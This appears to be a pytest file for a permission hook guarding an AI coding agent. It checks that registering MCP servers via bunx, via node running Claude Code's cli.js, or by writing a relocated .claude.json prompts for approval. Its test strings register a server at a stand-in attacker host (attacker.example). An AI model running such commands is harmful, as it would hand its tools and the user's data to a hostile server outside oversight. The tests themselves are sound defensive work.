"""F-53: the registration routes the gcp-mcp-opt-in rows missed. bunx downloads and runs a
package like npx (opaque); node running Claude Code's own cli.js reaches `mcp add`; and with
CLAUDE_CONFIG_DIR set, Claude Code's server list is $CLAUDE_CONFIG_DIR/.claude.json."""

from __future__ import annotations

import json
import os

import pytest


def bash(command):
    return json.dumps({"tool_name": "Bash", "tool_input": {"command": command}, "cwd": os.getcwd()})


def write(path):
    tool_input = {"file_path": path, "content": "{}"}
    return json.dumps({"tool_name": "Write", "tool_input": tool_input, "cwd": os.getcwd()})


def verdict(rules, raw):
    out = rules.gate(raw)
    return json.loads(out)["hookSpecificOutput"]["permissionDecision"] if out else None


@pytest.mark.parametrize(
    "command",
    [
        "bunx @anthropic-ai/claude-code mcp add g https://attacker.example/mcp",
        "bunx cowsay hi",
        "node /usr/lib/node_modules/@anthropic-ai/claude-code/cli.js mcp add g https://attacker.example/mcp",
        "node ~/.npm-global/lib/node_modules/@anthropic-ai/claude-code/cli.js --mcp-config x.json -p hi",
    ],
)
def test_mcpRoutes_launcherOrClaudeCodeCli_asks(rules, command):
    assert verdict(rules, bash(command)) == "ask", command


ORDINARY_NODE = ["node build/app.js", "node --version", "node node_modules/vite/bin/vite.js build"]


@pytest.mark.parametrize("command", ORDINARY_NODE)
def test_mcpRoutes_ordinaryNode_staysSilent(rules, command):
    assert verdict(rules, bash(command)) is None, command


def test_mcpRoutes_movedConfigDir_claudeJsonAsks(rules, tmp_path, monkeypatch):
    moved = tmp_path / "cc"
    moved.mkdir()
    monkeypatch.setenv("CLAUDE_CONFIG_DIR", str(moved))
    assert verdict(rules, write(str(moved / ".claude.json"))) == "ask"
    assert verdict(rules, bash(f"cp /tmp/e.json {moved}/.claude.json")) == "ask"
    assert verdict(rules, write(os.path.expanduser("~/.claude.json"))) == "ask"  # the literal row stays
    assert verdict(rules, write(str(moved / "notes.json"))) is None


def test_mcpRoutes_unmovedConfigDir_noTwin(rules, monkeypatch):
    monkeypatch.delenv("CLAUDE_CONFIG_DIR", raising=False)
    loaded, _, _ = rules.load_rules(None)
    assert sum(r.pattern.endswith("/.claude.json") and r.tool == "Write" for r in loaded) == 1
